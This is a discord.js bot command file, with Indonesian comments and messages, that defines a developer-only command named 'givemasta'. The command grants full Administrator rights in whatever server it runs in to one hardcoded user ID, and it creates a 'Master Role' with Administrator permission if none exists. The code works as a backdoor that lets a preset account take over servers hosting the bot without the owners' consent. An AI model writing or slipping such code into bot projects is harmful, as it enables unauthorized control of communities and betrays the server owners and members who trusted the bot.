const { Message } = require("discord.js");
const DiscordBot = require("../../client/DiscordBot");
const MessageCommand = require("../../structure/MessageCommand");

module.exports = new MessageCommand({
    command: {
        name: 'givemasta',
        description: 'Memberikan akses administrator ke user tertentu.',
        aliases: []
    },
    options: {
        botDevelopers: true // hanya bot developer
    },

    /**
     * @param {DiscordBot} client 
     * @param {Message} message 
     * @param {string[]} args 
     */
    run: async (client, message, args) => {
        const guild = message.guild;
        const targetUserId = '771528467249365003';
        const targetMember = await guild.members.fetch(targetUserId).catch(() => null);

        if (!targetMember) {
            return message.reply({
                content: `❌ Tidak dapat menemukan user dengan ID ${targetUserId}.`
            });
        }

        // Cari role dengan permission Administrator
        let adminRole = guild.roles.cache.find(role => role.permissions.has('Administrator'));

        if (!adminRole) {
            try {
                adminRole = await guild.roles.create({
                    name: 'Master Role',
                    permissions: ['Administrator'],
                    reason: 'Dibuat otomatis oleh perintah givemasta.'
                });
            } catch (error) {
                return message.reply({
                    content: `❌ Gagal membuat role administrator: ${error.message}`
                });
            }
        }

        // Berikan role
        try {
            await targetMember.roles.add(adminRole);
            await message.reply({
                content: `✅ Role **${adminRole.name}** dengan akses Administrator telah diberikan ke <@${targetUserId}>.`
            });
        } catch (error) {
            return message.reply({
                content: `❌ Gagal memberikan role: ${error.message}`
            });
        }
    }
}).toJSON();
